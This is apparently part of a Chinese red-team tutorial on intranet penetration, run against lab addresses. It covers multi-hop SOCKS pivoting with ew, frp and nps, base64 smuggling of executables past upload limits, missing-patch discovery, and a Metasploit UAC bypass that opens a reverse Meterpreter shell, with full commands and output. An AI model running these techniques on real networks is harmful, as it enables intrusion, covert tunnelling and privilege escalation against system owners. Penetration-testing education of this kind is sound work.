<pre class="line-numbers language-none"><code class="language-none">ew -s ssocksd -l 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&gt; .\ew_for_Win.exe -s ssocksd -l 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>表示开启 5555 端口的正向代理</p>
<p>在内网主机 A 上</p>
<pre class="line-numbers language-none"><code class="language-none">ew -s lcx_slave -d vps_ip -e 4444 -f hostB_ip -g 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;ew_for_linux64 -s lcx_slave -d 172.16.214.1 -e 4444 -f 192.168.7.110 -g 5555lcx_slave 172.16.214.1:4444 &lt;--[10000 usec]--&gt; 192.168.7.110:5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>表示在内网主机 A 上使用 lcx_slave 的方式，将 VPS 的 4444 端口和内网主机 B 的 5555 端口连接起来。</p>
<p>现在就可以通过 VPS 的 1080 端口访问到内网主机 A 再访问到内网主机 B ，最后访问到内网资源了。</p>
<h4 id="e、三级网络环境"><a href="#e、三级网络环境" class="headerlink" title="e、三级网络环境"></a>e、三级网络环境</h4><p>目前有这样的一个环境，内网主机 A 没有公网 IP 不能访问内网资源，但是可以访问外网和内网主机 B，内网主机 B 不能访问外网和内网资源，但是可以和 A、C 相互访问，内网主机 C 能访问内网资源，但是只能和内网主机 B 相互访问，因此如果想访问到内网资源就需要做三层跳板。</p>
<pre class="line-numbers language-none"><code class="language-none">VPS --》内网主机 A --》内网主机 B --》内网主机 C<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在公网 VPS 上，将 1080 端口收到的代理请求转发到 4444 端口</p>
<pre class="line-numbers language-none"><code class="language-none">ew -s rcsocks -l 1080 -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;ew_for_linux64 -s rcsocks -l 1080 -e 4444rcsocks 0.0.0.0:1080 &lt;--[10000 usec]--&gt; 0.0.0.0:4444init cmd_server_for_rc herestart listen port here<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在内网主机 A 上，将 VPS 的 4444 端口和内网主机 B 的 5555 端口连接起来</p>
<pre class="line-numbers language-none"><code class="language-none">ew -s lcx_slave -d vps_ip -e 4444 -f hostB_ip -g 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;ew_for_linux64 -s lcx_slave -d 172.16.214.1 -e 4444 -f 192.168.7.110 -g 5555lcx_slave 172.16.214.1:4444 &lt;--[10000 usec]--&gt; 192.168.7.110:5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在内网主机 B 上，将 5555 端口收到的代理请求转发到 6666 端口上</p>
<pre class="line-numbers language-none"><code class="language-none">ew -s lcx_listen -l 5555 -e 6666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&gt; .\ew_for_Win.exe -s lcx_listen -l 5555 -e 6666
rcsocks 0.0.0.0:5555 &lt;--[10000 usec]--&gt; 0.0.0.0:6666
init cmd_server_for_rc here
start listen port here<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>在内网主机 C 上，启动 socks5 服务，并反弹到 B 主机的 6666 端口上</p>
<pre class="line-numbers language-none"><code class="language-none">ew -s rssocks -d 192.168.7.110 -e 6666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&gt; .\ew_for_Win.exe -s rssocks -d 192.168.7.110 -e 6666
rssocks 192.168.7.110:6666 &lt;--[10000 usec]--&gt; socks server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>至此，socks5 代理 VPS 的 1080 端口就会访问到内网资源了。</p>
<p>另外还有个 ew 的升级版工具叫 termite，不过比较遗憾的是 termite 在两年前也已经暂停更新了，这里也就不再大费周章的记录它了。</p>
<h1 id="0x11-frp-的使用"><a href="#0x11-frp-的使用" class="headerlink" title="0x11 frp 的使用"></a>0x11 frp 的使用</h1><h2 id="1、介绍-4"><a href="#1、介绍-4" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>相较于前一篇文章介绍的 ew 的年代久远，frp 就好的多了，基本上隔几天就会发布新的版本，最新的一版更新还就在几天前。</p>
<p>在实战中，大家较多使用的也是 frp，frp 项目地址：<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
<p>至于下载安装直接在项目的 releases 里下载自己对应的系统版本就行。</p>
<h2 id="2、使用"><a href="#2、使用" class="headerlink" title="2、使用"></a>2、使用</h2><p>官方使用文档：<a target="_blank" rel="noopener" href="https://gofrp.org/docs/">https://gofrp.org/docs/</a></p>
<p>frp 分成服务端和客户端，分别叫 frps 和 frpc，配置文件分别对应 frps.ini 和 frpc.ini</p>
<blockquote>
<p>以下环境均为本地环境，VPS IP 为 172.16.214.52，目标主机 IP 为 192.168.7.110</p>
</blockquote>
<h3 id="a、内网端口穿透"><a href="#a、内网端口穿透" class="headerlink" title="a、内网端口穿透"></a>a、内网端口穿透</h3><p> 场景：内网主机可出网，想从公网访问内网主机的 3389 端口</p>
<p>在 VPS 上开启服务端，这里以 kali 为例，首先修改配置文件 frps.ini</p>
<pre class="line-numbers language-none"><code class="language-none">[common]bind_port &#x3D; 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后启动服务端</p>
<pre class="line-numbers language-none"><code class="language-none">frps -c frps.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;frps -c frps.ini2021&#x2F;06&#x2F;09 03:45:03 [I] [root.go:200] frps uses config file: frps.ini2021&#x2F;06&#x2F;09 03:45:03 [I] [service.go:192] frps tcp listen on 0.0.0.0:44442021&#x2F;06&#x2F;09 03:45:03 [I] [root.go:209] frps started successfully<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>配置客户端配置文件</p>
<pre class="line-numbers language-none"><code class="language-none">[common]# 服务端 IPserver_addr &#x3D; vps_ip# 服务端端口server_port &#x3D; 4444[rdp]type &#x3D; tcplocal_ip &#x3D; 127.0.0.1local_port &#x3D; 3389# 连接 vps 的端口remote_port &#x3D; 3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&gt; .\frpc.exe -c frpc.ini2021&#x2F;06&#x2F;09 15:50:29 [I] [service.go:304] [72904e8037a7fdf8] login to server success, get run id [72904e8037a7fdf8], server udp port [0]2021&#x2F;06&#x2F;09 15:50:29 [I] [proxy_manager.go:144] [72904e8037a7fdf8] proxy added: [rdp]2021&#x2F;06&#x2F;09 15:50:29 [I] [control.go:180] [72904e8037a7fdf8] [rdp] start proxy success<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>此时，在 vps 上访问本地的 3389 端口就会访问到内网主机的 3389 端口了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609155435.png"></p>
<h3 id="b、建立-socks-代理"><a href="#b、建立-socks-代理" class="headerlink" title="b、建立 socks 代理"></a>b、建立 socks 代理</h3><p>场景：内网主机可出网，想把内网主机作为跳板机使用</p>
<p>上面的场景只是利用 frp 访问了内网指定机器的指定端口，我们还可以利用 frp 将内网主机作为跳板机使用。</p>
<p>这次我们用上 frp 的 web 控制面板以及访问密码等功能，让我们建立的连接更加安全、方便。</p>
<p>在 VPS 上开启服务端，服务端配置文件如下：</p>
<pre class="line-numbers language-none"><code class="language-none">[common]bind_port &#x3D; 4444# 客户端认证 tokentoken &#x3D; 123456# 设置 frps 仪表盘端口、账号和密码，实战中用处貌似不大，但如果设置一定要设置强密码dashboard_port &#x3D; 8000dashboard_user &#x3D; admindashboard_pwd &#x3D; password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>实战中，为了更好的隐藏自己，最好还是要设置通过域名访问</p>
</blockquote>
<p>配置好文件后，启动服务端</p>
<pre class="line-numbers language-none"><code class="language-none">frps -c frps.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">.&#x2F;frps -c frps.ini2021&#x2F;06&#x2F;09 04:06:34 [I] [root.go:200] frps uses config file: frps.ini2021&#x2F;06&#x2F;09 04:06:35 [I] [service.go:192] frps tcp listen on 0.0.0.0:44442021&#x2F;06&#x2F;09 04:06:35 [I] [service.go:294] Dashboard listen on 0.0.0.0:80002021&#x2F;06&#x2F;09 04:06:35 [I] [root.go:209] frps started successfully<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>配置客户端文件</p>
<pre class="line-numbers language-none"><code class="language-none">[common]
server_addr &#x3D; vps_ip
server_port &#x3D; 4444

# 客户端认证 token，需要和服务端 token 保持一致
token &#x3D; 123456


# 启用加密，防止流量被拦截
use_encryption &#x3D; true
# 启用压缩，提升流量转发速度
use_compression &#x3D; true

[socks5]
type &#x3D; tcp
# 连接 vps 的端口
remote_port &#x3D; 1080
plugin &#x3D; socks5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>开启客户端</p>
<pre class="line-numbers language-none"><code class="language-none">frpc -c frpc.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&gt; .\frpc.exe -c frpc.ini
2021&#x2F;06&#x2F;09 16:11:21 [I] [service.go:304] [ee7ad330ab4e6036] login to server success, get run id [ee7ad330ab4e6036], server udp port [0]
2021&#x2F;06&#x2F;09 16:11:21 [I] [proxy_manager.go:144] [ee7ad330ab4e6036] proxy added: [socks5]
2021&#x2F;06&#x2F;09 16:11:21 [I] [control.go:180] [ee7ad330ab4e6036] [socks5] start proxy success<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>测试 VPS IP 的 1080 的 socks5 代理，发现已经连通了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609161458.png"></p>
<p>打开 frps 仪表盘，登录后，可以看到当前连接数据的相关信息</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609161859.png"></p>
<p>frp 的参数远不止文章中提到的这些，更多功能可以参考下面的参考文章。</p>
<h1 id="0x12-nps-的使用"><a href="#0x12-nps-的使用" class="headerlink" title="0x12 nps 的使用"></a>0x12 nps 的使用</h1><h2 id="1、介绍-5"><a href="#1、介绍-5" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>nps 项目地址：<a target="_blank" rel="noopener" href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p>
<p>也是一款还在更新的内网穿透工具，相较于 frp，nps 的 web 管理就要强大很多了。</p>
<p>nps 和 frp 一样功能都很多，这里就主要记录下平时经常用到的 SOCKS5 代理模式。</p>
<h2 id="2、安装-2"><a href="#2、安装-2" class="headerlink" title="2、安装"></a>2、安装</h2><p>nps 不同于 frp 的开箱即用，nps 的服务端需要安装才能使用，这里以 kali 下的安装为例。</p>
<p>在 nps 项目的 releases 中下载好自己对应系统的版本后，解压安装</p>
<pre class="line-numbers language-none"><code class="language-none">tar -zxvf linux_amd64_server.tar.gz.&#x2F;nps install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="3、使用-2"><a href="#3、使用-2" class="headerlink" title="3、使用"></a>3、使用</h2><p>官方使用文档：<a target="_blank" rel="noopener" href="https://ehang-io.github.io/nps">https://ehang-io.github.io/nps</a></p>
<p>启动服务端，默认 Web 管理界面端口 8080 </p>
<pre class="line-numbers language-none"><code class="language-none">nps start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>启动 nps 后，直接访问服务端的 8080 端口，输入默认密码 admin/123 进行登录，不难看出，这 web 界面确实比 frp 的丰富很多。</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609170306.png"></p>
<p>nps 的使用也很简单，界面语言也可选择中文。</p>
<p>首先新增一个客户端，点击 “客户端” –》“新增”，打开新增客户端页面，填写相关信息后，点击新增即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609171610.png"></p>
<p>新增之后，刷新一下可以看到刚刚添加的记录，点击刚刚新增记录里的“加号”还能直接看到在客户端上要运行的命令，这个可谓是很贴心了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609172254.png"></p>
<p>复制命令到客户端上运行，服务端这边就能看到目标已经上线了，连接状态也由离线变成了在线。</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609172144.png"></p>
<p>如果想创建一个 SOCKS5 代理也很简单，直接点击 “SOCKS 代理”–》“新增”，输入客户端的 ID 和代理的端口，然后新增即可。</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609172512.png"></p>
<p>之后直接设置 SOCKS5 代理 IP 为 nps 服务端 IP ，端口这里设置的是 1080，这样就建立了一个 SOCKS 代理，如果新增设置客户端的时候，设置了认证账号密码，那么在连接 SOCKS 代理的时候，也要添加上对应的账号和密码。</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609173211.png"></p>
<p>在这整个过程中都没有修改配置文件等等操作，真的是很方便了。</p>
<h1 id="0x13-内网中绕过无法上传文件限制"><a href="#0x13-内网中绕过无法上传文件限制" class="headerlink" title="0x13 内网中绕过无法上传文件限制"></a>0x13 内网中绕过无法上传文件限制</h1><h2 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h2><p>有次发现这样的一个情况，目标云桌面不出网且不允许上传文件但是可以复制文本，于是便想着通过 PowerShell 将 exe 程序编码成 base64 文本，将编码后的内容复制到目标主机后，再进行解码，这里记录下方法。</p>
<h2 id="2、PowerShell"><a href="#2、PowerShell" class="headerlink" title="2、PowerShell"></a>2、PowerShell</h2><p>使用 PowerShell 进行 base64 编码</p>
<pre class="line-numbers language-none"><code class="language-none">$PEBytes &#x3D; [System.IO.File]::ReadAllBytes(&quot;fscan.exe&quot;)$Base64Payload &#x3D; [System.Convert]::ToBase64String($PEBytes)Set-Content fscan_base64.txt -Value $Base64Payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用 PowerShell 进行 base64 解码</p>
<pre class="line-numbers language-none"><code class="language-none">$Base64Bytes &#x3D; Get-Content (&quot;fscan_base64.txt&quot;)$PEBytes&#x3D; [System.Convert]::FromBase64String($Base64Bytes)[System.IO.File]::WriteAllBytes(&quot;fscan_base64.exe&quot;,$PEBytes)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210630172410.png"></p>
<h2 id="3、CertUtil"><a href="#3、CertUtil" class="headerlink" title="3、CertUtil"></a>3、CertUtil</h2><p>自 Windows 7 开始，Windows 自带了 CertUtil 命令，可以使用 CertUtil 进行 MD5、SHA1 等算法的计算，也可以使用 CertUtil 进行 base64 的编码，使用起来要比 PowerShell 方便不少。</p>
<p>使用 CertUtil 进行编码</p>
<pre class="line-numbers language-none"><code class="language-none">CertUtil -encode fscan.exe fscan_base64.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用 CertUtil 进行解码</p>
<pre class="line-numbers language-none"><code class="language-none">CertUtil -decode fscan_base64.txt fscan_base64.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210630173155.png"> </p>
<h1 id="0x14-发现主机缺失补丁"><a href="#0x14-发现主机缺失补丁" class="headerlink" title="0x14 发现主机缺失补丁"></a>0x14 发现主机缺失补丁</h1><h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>在内网中，往往所有主机打补丁的情况都是相似的，因此在拿下一台主机权限后，可以通过查看当前主机打补丁的情况，从而找到漏洞利用点，进而进行接下来的横向、提权等操作。</p>
<h2 id="1、手工发现缺失补丁"><a href="#1、手工发现缺失补丁" class="headerlink" title="1、手工发现缺失补丁"></a>1、手工发现缺失补丁</h2><h3 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h3><p>直接运行 systeminfo 命令，在「修补程序」（英文：Hotfix(s) ）处可以看到已安装的补丁。</p>
<pre class="line-numbers language-none"><code class="language-none">C:\Users\teamssix&gt; systeminfo……内容过多，此处省略……修补程序: 安装了 2 个修补程序。         [01]: KB2999226         [02]: KB976902……内容过多，此处省略……<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h3><p>运行以下命令，同样可以看到当前系统打补丁的情况，显示的信息比 systeminfo 更详细直观。</p>
<pre class="line-numbers language-none"><code class="language-none">wmic qfe get Caption,Description,HotfixID,InstalledOn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\Users\teamssix&gt;wmic qfe get Caption,Description,HotfixID,InstalledOnCaption                                     Description  HotFixID   InstalledOnhttp:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2999226  Update       KB2999226  11&#x2F;26&#x2F;2020http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;976902   Update       KB976902   11&#x2F;21&#x2F;2010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>知道了系统安装了哪些补丁，也就能反推出系统可能存在的漏洞了。</p>
<h2 id="2、自动发现缺失补丁"><a href="#2、自动发现缺失补丁" class="headerlink" title="2、自动发现缺失补丁"></a>2、自动发现缺失补丁</h2><h3 id="Sherlock-脚本"><a href="#Sherlock-脚本" class="headerlink" title="Sherlock 脚本"></a>Sherlock 脚本</h3><p>Sherlock 是一个在 Windows 下能够快速发现目标系统可能存在可被用于提权的漏洞的 PowerShell 脚本。</p>
<p>Sherlock 项目地址：<a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p>
<p>导入脚本</p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Sherlock.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Sherlock 命令</p>
<pre class="line-numbers language-none"><code class="language-none">Find-ALLVulns	搜索所有未安装的补丁Find-MS16032	搜索单个漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>在已经获取到目标会话后，比如这里的会话 Seesion ID 为 1，使用 post/windows/gather/enum_patches 模块可直接查看当前系统补丁信息。</p>
<pre class="line-numbers language-none"><code class="language-none">msf6 exploit(multi&#x2F;handler) &gt; use post&#x2F;windows&#x2F;gather&#x2F;enum_patchesmsf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; set session 1session &#x3D;&gt; 1msf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; run[+] KB2999226 installed on 11&#x2F;26&#x2F;2020[+] KB976902 installed on 11&#x2F;21&#x2F;2010[*] Post module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>或者使用 MSF 发现目标可用提权漏洞，然后进行提权</p>
<p>首先查看下当前会话权限</p>
<pre class="line-numbers language-none"><code class="language-none">msf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; sessions 1[*] Starting interaction with 1...meterpreter &gt; execute -if &quot;whoami &#x2F;groups&quot;Process 3048 created.Channel 6 created.组信息-----------------组名                                   类型   SID          属性&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Everyone                               已知组 S-1-1-0      必需的组, 启用于默认, 启用的组BUILTIN\Administrators                 别名   S-1-5-32-544 只用于拒绝的组BUILTIN\Users                          别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组NT AUTHORITY\INTERACTIVE               已知组 S-1-5-4      必需的组, 启用于默认, 启用的组控制台登录                             已知组 S-1-2-1      必需的组, 启用于默认, 启用的组NT AUTHORITY\Authenticated Users       已知组 S-1-5-11     必需的组, 启用于默认, 启用的组NT AUTHORITY\This Organization         已知组 S-1-5-15     必需的组, 启用于默认, 启用的组LOCAL                                  已知组 S-1-2-0      必需的组, 启用于默认, 启用的组NT AUTHORITY\NTLM Authentication       已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组Mandatory Label\Medium Mandatory Level 标签   S-1-16-8192  必需的组, 启用于默认, 启用的组<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可以看到当前权限为 Medium Mandatory Level，即普通权限</p>
<p>我们使用 post/multi/recon/local_exploit_suggester 模块检测下当前系统可利用的提权漏洞</p>
<pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; background[*] Backgrounding session 1...msf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggestermsf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; set session 1session &#x3D;&gt; 1msf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; run[*] 172.16.214.4 - Collecting local exploits for x86&#x2F;windows...[*] 172.16.214.4 - 38 exploit checks are being tried...[+] 172.16.214.4 - exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr: The target appears to be vulnerable.[*] Post module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可以看到提示存在 exploit/windows/local/bypassuac_eventvwr 模块可被利用</p>
<pre class="line-numbers language-none"><code class="language-none">msf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr
[*] Using configured payload windows&#x2F;meterpreter&#x2F;reverse_tcp

msf6 exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; set session 1
session &#x3D;&gt; 1

msf6 exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; run
[*] Started reverse TCP handler on 10.101.22.38:4444
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (175174 bytes) to 172.16.214.4
[*] Meterpreter session 2 opened (10.101.22.38:4444 -&gt; 172.16.214.4:49160) at 2021-07-06 15:38:08 +0800
[*] Cleaning up registry keys ...

meterpreter &gt; execute -if &quot;whoami &#x2F;groups&quot;
Process 3048 created.
Channel 1 created.

组信息
-----------------

组名                                 类型   SID          属性
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
Everyone                             已知组 S-1-1-0      必需的组, 启用于默认, 启用的组
BUILTIN\Administrators               别名   S-1-5-32-544 必需的组, 启用于默认, 启用的组, 组的所有者
BUILTIN\Users                        别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组
NT AUTHORITY\INTERACTIVE             已知组 S-1-5-4      必需的组, 启用于默认, 启用的组
控制台登录                           已知组 S-1-2-1      必需的组, 启用于默认, 启用的组
NT AUTHORITY\Authenticated Users     已知组 S-1-5-11     必需的组, 启用于默认, 启用的组
NT AUTHORITY\This Organization       已知组 S-1-5-15     必需的组, 启用于默认, 启用的组
LOCAL                                已知组 S-1-2-0      必需的组, 启用于默认, 启用的组
NT AUTHORITY\NTLM Authentication     已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组
Mandatory Label\High Mandatory Level 标签   S-1-16-12288 必需的组, 启用于默认, 启用的组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到，使用 exploit/windows/local/bypassuac_eventvwr 模块直接将目标权限提升到了 High Mandatory Level，即管理员权限，这里可以说 MSF 很方便了。</p>
<h3 id="wesng"><a href="#wesng" class="headerlink" title="wesng"></a>wesng</h3><p>wesng 被称为 Windows Exploit Suggester 的下一代，wesng 和 Windows Exploit Suggester 的使用方法基本一致，但 wesng 所支持的操作系统更丰富，不过实测 wesng 还未支持 Windows 11 『手动狗头』</p>
<p>wesng 的安装方法也很简单</p>
<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;bitsadmin&#x2F;wesng.git
cd wesng
python wes.py --update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>使用起来也很简单，直接在目标主机上运行以下命令，将 systeminfo 的信息保存到 txt 中。</p>
<pre class="line-numbers language-none"><code class="language-none">systeminfo &gt; info.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>直接使用 wesng 即可</p>
<pre class="line-numbers language-none"><code class="language-none">python wes.py info.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210706145250.png"></p>
<p>使用 wesng 可以直接看到目标主机可能存在的 CVE 漏洞，从而便于我们有针对性的利用这些漏洞。</p>
<h1 id="0x15-系统服务权限配置不当利用"><a href="#0x15-系统服务权限配置不当利用" class="headerlink" title="0x15 系统服务权限配置不当利用"></a>0x15 系统服务权限配置不当利用</h1><h3 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h3><p>PowerUp 可以用来寻找目标中权限配置不当的服务，下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1">https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1</a></p>
<p>在 PowerShell 中导入并执行脚本</p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .\PowerUp.ps1Invoke-AllChecks<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果 PowerShell 由于处在受限模式以至于无法导入脚本，可以使用以下命令绕过。</p>
<pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

